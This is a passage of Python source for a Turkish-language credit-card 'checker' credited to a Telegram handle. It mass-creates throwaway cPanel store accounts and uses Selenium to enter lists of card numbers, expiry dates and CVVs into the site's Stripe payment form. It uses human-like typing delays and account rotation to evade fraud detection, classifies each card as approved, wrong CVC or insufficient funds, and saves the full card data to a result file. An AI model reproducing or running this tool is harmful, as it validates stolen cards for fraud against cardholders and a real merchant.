        expiry_formatted = f"{month.zfill(2)} / {year[-2:]}"  # MM / YY
        
        account = self.get_random_account()
        
        if not account:
            print("❌ Kullanılabilir hesap yok!")
            print("💡 Önce hesap oluşturun (Menü: 1 veya 2)")
            return
        
        driver, login_success = self.login_to_account(account)
        
        if not login_success:
            if driver:
                driver.quit()
            self.log_check(account['id'], card_number, "LOGIN_FAILED", 0, "Login başarısız")
            return
        
        try:
            print(f"\n{'='*60}")
            print(f"💳 KART CHECK İŞLEMİ")
            print(f"{'='*60}")
            print(f"Card: {card_number}")
            print(f"Exp: {month}/{year}")
            print(f"CVV: {cvv}")
            print(f"{'='*60}\n")
            
            start_time = time.time()
            
            # Payment Methods sayfasına git
            print("🌐 Payment Methods sayfasına gidiliyor...")
            driver.get("https://store.cpanel.net/account/paymentmethods")
            time.sleep(random.uniform(2, 3))
            
            # Add New Credit Card butonuna tıkla
            print("➕ Add New Credit Card butonuna tıklanıyor...")
            try:
                add_card_btn = WebDriverWait(driver, 10).until(
                    EC.element_to_be_clickable((By.XPATH, '//*[@id="main-body"]/div/div[1]/div[2]/div/div/p[2]/a'))
                )
                driver.execute_script("arguments[0].click();", add_card_btn)
                print("  ✓ Butona tıklandı")
            except:
                add_card_btn = driver.find_element(By.LINK_TEXT, "Add New Credit Card")
                driver.execute_script("arguments[0].click();", add_card_btn)
                print("  ✓ Butona tıklandı (Fallback)")
            
            time.sleep(random.uniform(3, 4))
            
            # Stripe her input için farklı iframe kullanır - TITLE ile bul!
            print("🔄 Stripe iframe yapısı analiz ediliyor...")
            wait = WebDriverWait(driver, 15)
            
            # Ana sayfada olduğundan emin ol
            driver.switch_to.default_content()
            
            # Card Number iframe'i bul (title ile)
            print("✍️  Kart numarası giriliyor...")
            try:
                # İframe'i title attribute'u ile bul
                card_iframe = WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.CSS_SELECTOR, "iframe[title*='kart numarası' i], iframe[title*='card number' i]"))
                )
                driver.switch_to.frame(card_iframe)
                print(f"  ✓ Card iframe bulundu")
                
                # Input'u bul (iframe içinde)
                card_input = WebDriverWait(driver, 5).until(
                    EC.presence_of_element_located((By.CSS_SELECTOR, "input[name='cardnumber'], input[placeholder*='1234' i]"))
                )
                card_input.clear()
                time.sleep(0.3)
                
                # Human-like typing
                for digit in card_number:
                    card_input.send_keys(digit)
                    time.sleep(random.uniform(0.05, 0.1))
                
                # Blur event (focus'u kaybettir)
                driver.execute_script("arguments[0].blur();", card_input)
                time.sleep(0.3)
                
                print(f"  ✓ Kart numarası girildi")
                driver.switch_to.default_content()
                
            except Exception as e:
                driver.switch_to.default_content()
                raise Exception(f"Kart numarası inputu bulunamadı: {str(e)}")
            
            time.sleep(random.uniform(1.5, 2))
            
            # Hemen declined kontrolü
            try:
                driver.switch_to.default_content()
                time.sleep(1)
                page_source = driver.page_source.lower()
                
                declined_indicators = [
                    "kart numaranız geçersiz",
                    "kartınız reddedildi",
                    "lütfen kartınızı veren bankayla",
                    "declined",
                    "invalid card",
                    "card was declined"
                ]
                
                if any(ind in page_source for ind in declined_indicators):
                    print("❌ DECLINED - Kart numarası geçersiz")
                    response_time = time.time() - start_time
                    self.log_check(account['id'], card_number, "DECLINED", response_time, "Invalid card number")
                    self.db.update_account_usage(account['id'])
                    
                    print("🔄 Sayfa yenileniyor...")
                    driver.get("https://store.cpanel.net/account/paymentmethods")
                    time.sleep(2)
                    return "DECLINED"
            except:
                pass
            
            # Expiry Date iframe'i bul (title ile)
            print("✍️  Son kullanma tarihi giriliyor...")
            try:
                driver.switch_to.default_content()
                
                # İframe'i title attribute'u ile bul
                expiry_iframe = WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.CSS_SELECTOR, "iframe[title*='son kullanma' i], iframe[title*='expir' i]"))
                )
                driver.switch_to.frame(expiry_iframe)
                print(f"  ✓ Expiry iframe bulundu")
                
                # Input'u bul
                expiry_input = WebDriverWait(driver, 5).until(
                    EC.presence_of_element_located((By.CSS_SELECTOR, "input[name='exp-date'], input[placeholder*='MM' i]"))
                )
                expiry_input.clear()
                time.sleep(0.3)
                
                # TAB ile ayrılmış format: MM{TAB}YY
                from selenium.webdriver.common.keys import Keys
                expiry_input.send_keys(month)
                time.sleep(0.2)
                expiry_input.send_keys(Keys.TAB)
                time.sleep(0.2)
                expiry_input.send_keys(year[-2:])  # Son 2 hanesi
                
                # Blur event
                driver.execute_script("arguments[0].blur();", expiry_input)
                time.sleep(0.3)
                
                print(f"  ✓ Tarih girildi: {month}/{year[-2:]}")
                driver.switch_to.default_content()
                
            except Exception as e:
                driver.switch_to.default_content()
                print(f"  ⚠️  Expiry input hatası: {str(e)}")
            
            time.sleep(random.uniform(1.5, 2))
            
            # CVV iframe'i bul (title ile)
            print("✍️  CVV giriliyor...")
            try:
                driver.switch_to.default_content()
                
                # İframe'i title attribute'u ile bul
                cvv_iframe = WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.CSS_SELECTOR, "iframe[title*='CVC' i], iframe[title*='CVV' i], iframe[title*='güvenlik' i]"))
                )
                driver.switch_to.frame(cvv_iframe)
                print(f"  ✓ CVV iframe bulundu")
                
                # Input'u bul
                cvv_input = WebDriverWait(driver, 5).until(
                    EC.presence_of_element_located((By.CSS_SELECTOR, "input[name='cvc'], input[name='cvv'], input[placeholder*='CVC' i]"))
                )
                cvv_input.clear()
                time.sleep(0.3)
                
                # CVV'yi yaz
                cvv_input.send_keys(cvv)
                time.sleep(0.2)
                
                # Blur event
                driver.execute_script("arguments[0].blur();", cvv_input)
                time.sleep(0.3)
                
                print(f"  ✓ CVV girildi")
                driver.switch_to.default_content()
                
            except Exception as e:
                driver.switch_to.default_content()
                print(f"  ❌ CVV input hatası: {str(e)}")
                # Screenshot
                try:
                    screenshot_name = f"cvv_error_{int(time.time())}.png"
                    driver.save_screenshot(screenshot_name)
                    print(f"  📸 Screenshot: {screenshot_name}")
                except:
                    pass
            
            time.sleep(random.uniform(1.5, 2))
            
            # Ana sayfaya dön
            driver.switch_to.default_content()
            
            # Save Changes butonuna tıkla
            print("💾 Save Changes butonuna tıklanıyor...")
            try:
                save_btn = driver.find_element(By.XPATH, "//button[contains(text(), 'Save Changes')]")
                driver.execute_script("arguments[0].click();", save_btn)
                print("  ✓ Save tıklandı")
            except:
                save_btn = driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
                driver.execute_script("arguments[0].click();", save_btn)
                print("  ✓ Save tıklandı (Fallback)")
            
            # Sonuç bekleme ve kontrol
            print("⏳ Sonuç bekleniyor...")
            time.sleep(6)
            
            page_source = driver.page_source.lower()
            current_url = driver.current_url
            
            response_time = time.time() - start_time
            
            # Başarı kontrolü
            success_indicators = [
                "payment method has been added" in page_source,
                "successfully added" in page_source,
                "paymentmethods" in current_url and "add" not in current_url
            ]
            
            # Declined kontrolü
            declined_indicators = [
                "kartınız reddedildi" in page_source,
                "lütfen kartınızı veren bankayla" in page_source,
                "declined" in page_source,
                "card was declined" in page_source,
                "invalid" in page_source
            ]
            
            if any(success_indicators):
                print(f"✅ APPROVED - Kart geçerli! ({response_time:.2f}s)")
                result = "APPROVED"
                self.log_check(account['id'], card_number, result, response_time, "Card valid and approved")
                
            elif any(declined_indicators):
                print(f"❌ DECLINED - Kart reddedildi ({response_time:.2f}s)")
                result = "DECLINED"
                self.log_check(account['id'], card_number, result, response_time, "Card declined by bank")
                
            else:
                print(f"⚠️  UNKNOWN - Belirsiz sonuç ({response_time:.2f}s)")
                result = "UNKNOWN"
                self.log_check(account['id'], card_number, result, response_time, f"Unknown response - URL: {current_url}")
                
                # Screenshot al
                screenshot_name = f"unknown_result_{int(time.time())}.png"
                driver.save_screenshot(screenshot_name)
                print(f"📸 Screenshot: {screenshot_name}")
            
            # Check count güncelle
            self.db.update_account_usage(account['id'])
            
            # Sayfayı yenile (sonraki kart için)
            if result != "APPROVED":  # Approved ise zaten payment methods sayfasındayız
                print("🔄 Sayfa yenileniyor (F5)...")
                driver.get("https://store.cpanel.net/account/paymentmethods")
                time.sleep(2)
            
            return result
            
        except Exception as e:
            print(f"❌ Check hatası: {str(e)}")
            response_time = time.time() - start_time
            self.log_check(account['id'], card_number, "ERROR", response_time, str(e))
            
            # Screenshot
            try:
                screenshot_name = f"check_error_{int(time.time())}.png"
                driver.save_screenshot(screenshot_name)
                print(f"📸 Screenshot: {screenshot_name}")
            except:
                pass
            
            return "ERROR"
        finally:
            if driver:
                driver.quit()
    
    def log_check(self, account_id, card_number, result, response_time, message):
        """Check logunu kaydet"""
        import hashlib
        card_hash = hashlib.md5(card_number.encode()).hexdigest()[:8]
        
        cursor = self.db.cursor
        cursor.execute('''
            INSERT INTO checks (account_id, card_hash, result, response_time, checked_date, error_message)
            VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP, ?)
        ''', (account_id, card_hash, result, response_time, message))
        
        # Başarı sayısını güncelle
        if result == "APPROVED":
            cursor.execute('''
                UPDATE accounts SET success_count = success_count + 1 WHERE id = ?
            ''', (account_id,))
        
        self.db.conn.commit()
    
    def check_cards_from_file(self, filename):
        """Dosyadan kartları oku ve check et (Akıllı hesap rotasyonu)"""
        try:
            with open(filename, 'r') as f:
                cards = [line.strip() for line in f if line.strip()]
            
            print(f"\n📋 {len(cards)} adet kart bulundu")
            print(f"🚀 Check işlemi başlıyor...\n")
            
            CHECKS_PER_ACCOUNT = 150  # Her hesap 150 kart check eder
            
            results = {
                'APPROVED': 0,
                'DECLINED': 0,
                'ERROR': 0,
                'UNKNOWN': 0
            }
            
            detailed_results = []  # Detaylı sonuçlar için
            
            driver = None
            current_account = None
            checks_on_current_account = 0
            
            for idx, card in enumerate(cards, 1):
                print(f"\n{'='*60}")
                print(f"📍 Kart {idx}/{len(cards)}")
                
                # Yeni hesaba geç gerekirse (SADECE 150'de bir)
                if driver is None or checks_on_current_account >= CHECKS_PER_ACCOUNT:
                    if driver:
                        print(f"\n🔄 {CHECKS_PER_ACCOUNT} kart tamamlandı, yeni hesaba geçiliyor...")
                        driver.quit()
                        time.sleep(2)
                    
                    # Yeni hesap seç
                    current_account = self.get_random_account()
                    
                    if not current_account:
                        print("❌ Kullanılabilir hesap kalmadı!")
                        break
                    
                    print(f"\n🔐 Yeni Hesap Login")
                    print(f"📧 Email: {current_account['email']}")
                    print(f"📊 Hesap Durumu: {current_account['check_count']}/{CARDS_PER_ACCOUNT}")
                    
                    # Login
                    driver, login_success = self.login_to_account(current_account)
                    
                    if not login_success:
                        print("❌ Login başarısız, bir sonraki hesaba geçiliyor...")
                        driver = None
                        continue
                    
                    checks_on_current_account = 0
                    print(f"✅ Login başarılı, check başlıyor...\n")
                
                print(f"{'='*60}")
                print(f"📊 Bu hesapta: {checks_on_current_account + 1}/{CHECKS_PER_ACCOUNT}")
                
                # Kartı check et (AYNI DRIVER İLE)
                result, card_type, decline_reason = self.check_card_with_existing_driver(
                    driver, current_account, card
                )
                
                if result:
                    results[result] = results.get(result, 0) + 1
                    checks_on_current_account += 1
                    
                    # Detaylı sonuç kaydet
                    parts = card.strip().split('|')
                    card_number = parts[0].replace(' ', '') if len(parts) > 0 else 'UNKNOWN'
                    month = parts[1] if len(parts) > 1 else 'XX'
                    year = parts[2] if len(parts) > 2 else 'XX'
                    cvv = parts[3] if len(parts) > 3 else 'XXX'
                    
                    detailed_results.append({
                        'card_type': card_type,
                        'card_number': card_number,
                        'month': month,
                        'year': year,
                        'cvv': cvv,
                        'reason': decline_reason,
                        'result': result
                    })
                
                # Kartlar arası bekleme (AYNI HESAP İÇİNDE)
                if idx < len(cards) and checks_on_current_account < CHECKS_PER_ACCOUNT:
                    wait_time = random.uniform(2, 4)
                    print(f"⏳ Sonraki kart: {wait_time:.1f}s...")
                    time.sleep(wait_time)
            
            # Son driver'ı kapat
            if driver:
                driver.quit()
            
            # Detaylı rapor oluştur
            self.generate_result_file(results, detailed_results)
            
            print(f"\n{'='*60}")
            print(f"✅ Tüm kartlar kontrol edildi!")
            print(f"📄 Detaylı rapor: result.txt")
            print(f"{'='*60}\n")
            
        except FileNotFoundError:
            print(f"❌ '{filename}' dosyası bulunamadı!")
        except Exception as e:
            print(f"❌ Hata: {str(e)}")
            if driver:
                driver.quit()
    
    def generate_result_file(self, results, detailed_results):
        """result.txt dosyası oluştur"""
        with open('result.txt', 'w', encoding='utf-8') as f:
            f.write("=" * 60 + "\n")
            f.write("           SNKRX CHECKER v1.0           \n")
            f.write("=" * 60 + "\n\n")
            
            f.write("📊 ÖZET İSTATİSTİKLER:\n")
            f.write("-" * 60 + "\n")
            f.write(f"✅ APPROVED:  {results.get('APPROVED', 0)}\n")
            f.write(f"❌ DECLINED:  {results.get('DECLINED', 0)}\n")
            f.write(f"⚠️ UNKNOWN:   {results.get('UNKNOWN', 0)}\n")
            f.write(f"🔴 ERROR:     {results.get('ERROR', 0)}\n")
            f.write("-" * 60 + "\n")
            
            total = sum(results.values())
            if total > 0:
                approval_rate = (results.get('APPROVED', 0) / total) * 100
                f.write(f"📈 Başarı Oranı: %{approval_rate:.2f}\n")
            
            f.write("\n" + "=" * 60 + "\n")
            f.write("           DETAYLI SONUÇLAR           \n")
            f.write("=" * 60 + "\n\n")
            
            # Detaylı sonuçlar
            for idx, item in enumerate(detailed_results, 1):
                status_emoji = "✅" if item['result'] == "APPROVED" else "❌"
                
                f.write(f"{idx}. {status_emoji} {item['card_type']}|")
                f.write(f"{item['card_number']}|")
                f.write(f"{item['month']}|")
                f.write(f"{item['year']}|")
                f.write(f"{item['cvv']}|")
                f.write(f"{item['reason']}|")
                f.write(f"{item['result']}\n")
            
            f.write("\n" + "=" * 60 + "\n")
            f.write("@BySnors : TG\n")
            f.write("=" * 60 + "\n")
        
        print("\n📄 result.txt dosyası oluşturuldu!")
    
    def detect_card_type(self, card_number):
        """Kart tipini tespit et (BIN'e göre)"""
        if card_number.startswith('4'):
            return 'VISA'
        elif card_number.startswith(('51', '52', '53', '54', '55')):
            return 'MASTERCARD'
        elif card_number.startswith(('34', '37')):
            return 'AMEX'
        elif card_number.startswith('6'):
            return 'DISCOVER'
        else:
            return 'UNKNOWN'
    
    def check_card_with_existing_driver(self, driver, account, card_data):
        """Mevcut driver ile kart check et - Return (result, card_type, decline_reason)"""
        # Card formatı parse
        parts = card_data.strip().split('|')
        
        if len(parts) < 3:
            print(f"❌ Geçersiz kart formatı!")
            return ("ERROR", "UNKNOWN", "Geçersiz format")
        
        card_number = parts[0].replace(' ', '')
        card_type = self.detect_card_type(card_number)
        
        if len(parts) == 4:
            month = parts[1]
            year = parts[2]
            cvv = parts[3]
        else:
            if '/' in parts[1]:
                month, year = parts[1].split('/')
            else:
                month = parts[1]
                year = parts[2] if len(parts) > 2 else ''
            cvv = parts[2] if len(parts) == 3 else parts[3] if len(parts) == 4 else ''
        
        if len(year) == 2:
            year = f"20{year}"
        
        try:
            print(f"💳 Kart: {card_number} ({card_type})")
            print(f"📅 Exp: {month}/{year}")
            print(f"🔒 CVV: {cvv}")
            
            start_time = time.time()
            
            # Payment Methods sayfasına git
            print("🔄 Payment Methods...")
            driver.get("https://store.cpanel.net/account/paymentmethods")
            time.sleep(random.uniform(2, 3))
            
            # Add New Credit Card butonuna tıkla
            print("➕ Add Card...")
            try:
                add_card_btn = WebDriverWait(driver, 10).until(
                    EC.element_to_be_clickable((By.XPATH, '//*[@id="main-body"]/div/div[1]/div[2]/div/div/p[2]/a'))
                )
                driver.execute_script("arguments[0].click();", add_card_btn)
            except:
                add_card_btn = driver.find_element(By.LINK_TEXT, "Add New Credit Card")
                driver.execute_script("arguments[0].click();", add_card_btn)
            
            time.sleep(random.uniform(3, 4))
            
            # Card Number
            driver.switch_to.default_content()
            card_iframe = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, "iframe[title*='kart numarası' i], iframe[title*='card number' i]"))
            )
            driver.switch_to.frame(card_iframe)
            
            card_input = WebDriverWait(driver, 5).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, "input[name='cardnumber'], input[placeholder*='1234' i]"))
            )
            card_input.clear()
            time.sleep(0.3)
            
            for digit in card_number:
                card_input.send_keys(digit)
                time.sleep(random.uniform(0.05, 0.1))
            
            driver.execute_script("arguments[0].blur();", card_input)
            time.sleep(0.3)
            driver.switch_to.default_content()
            time.sleep(1.5)
            
            # Declined kontrolü (kart numarası)
            try:
                page_source = driver.page_source.lower()
                declined_indicators = [
                    "kart numaranız geçersiz",
                    "kartınız reddedildi",
                    "lütfen kartınızı veren bankayla",
                    "declined",
                    "invalid card"
                ]
                
                if any(ind in page_source for ind in declined_indicators):
                    print("❌ DECLINED - Geçersiz kart numarası")
                    response_time = time.time() - start_time
                    self.log_check(account['id'], card_number, "DECLINED", response_time, "Invalid card number")
                    self.db.update_account_usage(account['id'])
                    return ("DECLINED", card_type, "Geçersiz kart numarası")
            except:
                pass
            
            # Expiry Date
            from selenium.webdriver.common.keys import Keys
            
            driver.switch_to.default_content()
            expiry_iframe = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, "iframe[title*='son kullanma' i], iframe[title*='expir' i]"))
            )
            driver.switch_to.frame(expiry_iframe)
            
            expiry_input = WebDriverWait(driver, 5).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, "input[name='exp-date'], input[placeholder*='MM' i]"))
            )
            expiry_input.clear()
            time.sleep(0.3)
            expiry_input.send_keys(month)
            time.sleep(0.2)
            expiry_input.send_keys(Keys.TAB)
            time.sleep(0.2)
            expiry_input.send_keys(year[-2:])
            
            driver.execute_script("arguments[0].blur();", expiry_input)
            time.sleep(0.3)
            driver.switch_to.default_content()
            time.sleep(1.5)
            
            # CVV
            driver.switch_to.default_content()
            cvv_iframe = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, "iframe[title*='CVC' i], iframe[title*='CVV' i], iframe[title*='güvenlik' i]"))
            )
            driver.switch_to.frame(cvv_iframe)
            
            cvv_input = WebDriverWait(driver, 5).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, "input[name='cvc'], input[name='cvv'], input[placeholder*='CVC' i]"))
            )
            cvv_input.clear()
            time.sleep(0.3)
            cvv_input.send_keys(cvv)
            time.sleep(0.2)
            
            driver.execute_script("arguments[0].blur();", cvv_input)
            time.sleep(0.3)
            driver.switch_to.default_content()
            time.sleep(1.5)
            
            # Save Changes
            print("💾 Save...")
            try:
                save_btn = driver.find_element(By.XPATH, "//button[contains(text(), 'Save Changes')]")
                driver.execute_script("arguments[0].click();", save_btn)
            except:
                save_btn = driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
                driver.execute_script("arguments[0].click();", save_btn)
            
            # Stripe yanıtı için YAVAŞ bekleme
            print("⏳ Stripe işliyor...")
            time.sleep(4)  # İlk yanıt
            
            # Sayfada hata mesajı var mı hızlı kontrol
            page_source = driver.page_source.lower()
            
            if any(word in page_source for word in ["hatalı", "yanlış", "declined", "error", "reddedildi", "incorrect"]):
                print("⚠️  Hata mesajı yükleniyor, bekleniyor...")
                time.sleep(6)  # TAM mesaj için 6 saniye daha
            else:
                # Başarı olabilir veya henüz cevap gelmedi
                print("⏳ Yanıt bekleniyor...")
                time.sleep(4)  # Normal bekleme
            
            # Son kontrol - emin olmak için
            print("🔍 Detaylı kontrol yapılıyor...")
            time.sleep(5)  # Son 2 saniye
            
            # Şimdi TAMAMEN analiz et
            page_source = driver.page_source.lower()
            current_url = driver.current_url
            response_time = time.time() - start_time
            
            # APPROVED kontrolü
            approved_indicators = [
                "payment method added successfully" in page_source,
                "payment method has been added" in page_source,
                "successfully added" in page_source,
                "başarıyla eklendi" in page_source,
                "/account/paymentmethods" in current_url and "add" not in current_url
            ]
            
            # DECLINED sebepleri analiz (Daha spesifik keywords)
            decline_reasons = {
                "CVC HATALI": [
                    "cvc yanlış", 
                    "cvc hatalı", 
                    "cvc'si yanlış", 
                    "kartınızın cvc",
                    "incorrect cvc",
                    "güvenlik kodu",
                    "Kartınızın CVC'si yanlış."
                    "security code is incorrect",
                    "cvc is incorrect"
                ],
                "YETERSİZ BAKİYE": [
                    "insufficient", 
                    "yetersiz bakiye", 
                    "yetersiz fon", 
                    "insufficient funds",
                    "bakiye"
                ],
                "KART REDDEDİLDİ": [
                    "Kartınız bu tür satın alımları desteklemiyor.",
                    "do not honor",
                    "generic decline",
                    "transaction not permitted",
                    "banka tarafından reddedildi",
                    "kartınız reddedildi",
                    "lütfen kartınızı veren bankayla",
                    "Kartınız bu tür satın alımları desteklemiyor.",
                    "Kartınız reddedildi. Lütfen kartınızı veren bankayla iletişime geçin."
                ],
                "GEÇERSİZ KART": [
                    "invalid card", 
                    "geçersiz kart", 
                    "card number is invalid",
                    "kart numarası geçersiz"
                ],              
            }
            
            # ÖNCELİK SIRASI: CVC ve YETERSİZ BAKİYE önce kontrol edilmeli
            decline_reason = "KART REDDEDİLDİ"  # Default
            
            # Önce spesifik hataları kontrol et
            for reason in ["CVC HATALI", "YETERSİZ BAKİYE", "GEÇERSİZ KART", "KART REDDEDİLDİ"]:
                keywords = decline_reasons[reason]
                if any(keyword in page_source for keyword in keywords):
                    decline_reason = reason
                    break  # İlk eşleşeni al
            
            if any(approved_indicators):
                print(f"✅ APPROVED ({response_time:.2f}s)")
                result = "APPROVED"
                reason = "SUCCESSFUL"
                self.log_check(account['id'], card_number, result, response_time, reason)
                
            elif any(keyword in page_source for keywords in decline_reasons.values() for keyword in keywords):
                print(f"❌ DECLINED - {decline_reason} ({response_time:.2f}s)")
                result = "DECLINED"
                self.log_check(account['id'], card_number, result, response_time, decline_reason)
                
            else:
                print(f"⚠️  UNKNOWN ({response_time:.2f}s)")
                result = "UNKNOWN"
                decline_reason = "Belirsiz sonuç"
                self.log_check(account['id'], card_number, result, response_time, decline_reason)
                
                screenshot_name = f"unknown_{int(time.time())}.png"
                driver.save_screenshot(screenshot_name)
            
            # Check count güncelle
            self.db.update_account_usage(account['id'])
            
            return (result, card_type, decline_reason if result != "APPROVED" else reason)
            
        except Exception as e:
            print(f"❌ ERROR: {str(e)}")
            response_time = time.time() - start_time
            self.log_check(account['id'], card_number, "ERROR", response_time, str(e))
            
            try:
                screenshot_name = f"error_{int(time.time())}.png"
                driver.save_screenshot(screenshot_name)
            except:
                pass
            
            return ("ERROR", card_type, str(e))
if __name__ == "__main__":
    print("""
    ╔══════════════════════════════════════════════════════════╗
    ║   cPanel Store Account Creator & Checker System v1.0    ║
    ║         Adım 1: Account Creator (XPath Updated)         ║
    ╚══════════════════════════════════════════════════════════╝
    """)
    
    creator = AccountCreator(headless=HEADLESS_MODE)
    
    while True:
        print("\n📊 Menü:")
        print("1. Tek hesap oluştur")
        print("2. Çoklu hesap oluştur")
        print("3. Database istatistiklerini gör")
        print("4. Headless modu değiştir (Şu an: {})".format("AÇ" if HEADLESS_MODE else "KAPALI"))
        print("5. CC Checker")
        print("6. Çıkış")
        
        choice = input("\nSeçiminiz: ").strip()
        
        if choice == "1":
            print("\n" + "="*60)
            creator.create_account()
            
        elif choice == "2":
            try:
                count = int(input("Kaç hesap oluşturulsun? "))
                if count > 0:
                    print("\n" + "="*60)
                    creator.create_multiple_accounts(count)
                else:
                    print("❌ Geçerli bir sayı girin!")
            except ValueError:
                print("❌ Lütfen sayı girin!")
                
        elif choice == "3":
            db = Database()
            print("\n" + "="*60)
            print("📊 DATABASE İSTATİSTİKLERİ")
            print("="*60)
            
            # Toplam hesaplar
            db.cursor.execute("SELECT COUNT(*) FROM accounts")
            total = db.cursor.fetchone()[0]
            print(f"📝 Toplam hesap sayısı: {total}")
            
            # Aktif hesaplar
            db.cursor.execute("SELECT COUNT(*) FROM accounts WHERE status='active'")
            active = db.cursor.fetchone()[0]
            print(f"✅ Aktif hesap: {active}")
            
            # Banned hesaplar
            db.cursor.execute("SELECT COUNT(*) FROM accounts WHERE status='banned'")
            banned = db.cursor.fetchone()[0]
            print(f"🚫 Banned hesap: {banned}")
            
            # Toplam check sayısı
            db.cursor.execute("SELECT SUM(check_count) FROM accounts")
            total_checks = db.cursor.fetchone()[0] or 0
            print(f"🔍 Toplam check sayısı: {total_checks}")
            
            # Ortalama check/hesap
            if total > 0:
                avg_checks = total_checks / total
                print(f"📊 Ortalama check/hesap: {avg_checks:.1f}")
            
            # Fraud alerts
            db.cursor.execute("SELECT SUM(fraud_alerts) FROM accounts")
            total_frauds = db.cursor.fetchone()[0] or 0
            print(f"⚠️  Toplam fraud alert: {total_frauds}")
            
            # En çok kullanılan hesaplar (Top 5)
            db.cursor.execute("""
                SELECT email, check_count, success_count, fraud_alerts 
                FROM accounts 
                ORDER BY check_count DESC 
                LIMIT 5
            """)
            top_accounts = db.cursor.fetchall()
            
            if top_accounts:
                print(f"\n🏆 En Çok Kullanılan 5 Hesap:")
                for idx, (email, checks, success, frauds) in enumerate(top_accounts, 1):
                    print(f"  {idx}. {email}")
                    print(f"     └─ Checks: {checks} | Success: {success} | Frauds: {frauds}")
            
            # Son oluşturulan hesaplar
            db.cursor.execute("""
                SELECT email, created_date, status 
                FROM accounts 
                ORDER BY created_date DESC 
                LIMIT 3
            """)
            recent = db.cursor.fetchall()
            
            if recent:
                print(f"\n🆕 Son Oluşturulan 3 Hesap:")
                for email, created, status in recent:
                    print(f"  • {email} ({status}) - {created}")
            
            print("="*60 + "\n")
            
        elif choice == "4":
            HEADLESS_MODE = not HEADLESS_MODE
            creator.headless = HEADLESS_MODE
            status = "AÇ ✓" if HEADLESS_MODE else "KAPALI ✗"
            print(f"\n✅ Headless modu: {status}")
            
        elif choice == "5":
            checker = CCChecker(headless=HEADLESS_MODE)
            
            print("\n💳 CC CHECKER MODU")
            print("="*60)
            print("1. Tek kart check et")
            print("2. Dosyadan kartları check et")
            print("3. Geri dön")
            
            checker_choice = input("\nSeçiminiz: ").strip()
            
            if checker_choice == "1":
                card = input("\nKart formatı (4532123456789012|12|2025|123): ").strip()
                if card:
                    checker.check_single_card(card)
                else:
                    print("❌ Geçersiz kart formatı!")
                    
            elif checker_choice == "2":
                filename = input("\nDosya adı (örn: cards.txt): ").strip()
                if filename:
                    checker.check_cards_from_file(filename)
                else:
                    print("❌ Dosya adı gerekli!")
                    
            elif checker_choice == "3":
                continue
            else:
                print("❌ Geçersiz seçim!")
            
        elif choice == "6":
            print("\n👋 Çıkış yapılıyor...")
            break
            
        else:
            print("❌ Geçersiz seçim! Lütfen 1-5 arası bir sayı girin.")